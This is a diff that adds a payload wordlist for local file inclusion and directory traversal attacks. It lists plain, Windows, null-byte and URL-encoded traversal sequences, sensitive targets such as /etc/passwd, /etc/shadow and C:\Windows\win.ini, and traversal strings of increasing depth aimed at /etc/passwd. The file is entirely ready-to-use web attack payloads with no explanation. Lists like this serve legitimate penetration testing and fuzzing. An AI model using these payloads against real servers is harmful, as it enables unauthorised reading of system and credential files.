@@ -1,0 +1,37 @@
+# LFI/Directory Traversal Payloads
+
+## Basic Payloads
+../../
+..//..//
+..../
+....//
+../
+
+## Windows
+..\..\
+..\..\..\
+..\..\..\..\
+
+## Null Byte
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+
+## Encoding
+..%252f
+..%252f..%252f
+..%c0%af..%c0%af
+..%uff0f..%uff0f
+
+## Common Paths
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/var/www/html/index.php
+C:\Windows\win.ini
+C:\boot.ini
+
+## Depth Variations
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
